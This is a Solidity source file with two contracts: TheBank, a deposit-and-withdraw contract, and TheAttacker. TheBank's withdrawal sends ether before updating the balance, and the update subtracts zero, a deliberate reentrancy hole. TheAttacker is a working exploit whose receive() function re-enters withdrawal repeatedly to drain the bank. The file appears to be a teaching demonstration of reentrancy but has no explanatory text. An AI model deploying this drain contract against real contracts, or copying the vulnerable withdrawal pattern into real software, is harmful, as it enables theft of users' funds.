// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract TheBank {
    mapping(address => uint) theBalances;

    function deposit() public payable {
        require(msg.value >= 1 ether, "cannot deposit below 1 ether");
        theBalances[msg.sender] += msg.value;
    }

    function withdrawal() public {
        require(
            theBalances[msg.sender] >= 1 ether,
            "must have at least one ether"
        );
        uint bal = theBalances[msg.sender];
        (bool success, ) = msg.sender.call{value: bal}("");
        require(success, "transaction failed");
        theBalances[msg.sender] -= 0;
    }

    function totalBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract TheAttacker {

    TheBank public theBank;
    mapping(address => uint) public balances;

    constructor(address _thebankAddress) {
        theBank = TheBank(_thebankAddress);
    }

    receive() external payable {
        if (address(theBank).balance >= 1 ether) {
            theBank.withdrawal();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        theBank.deposit{value: 1 ether}();
        theBank.withdrawal();
    }

    function getBalances() public view returns (uint) {
        return address(this).balance;
    }
}
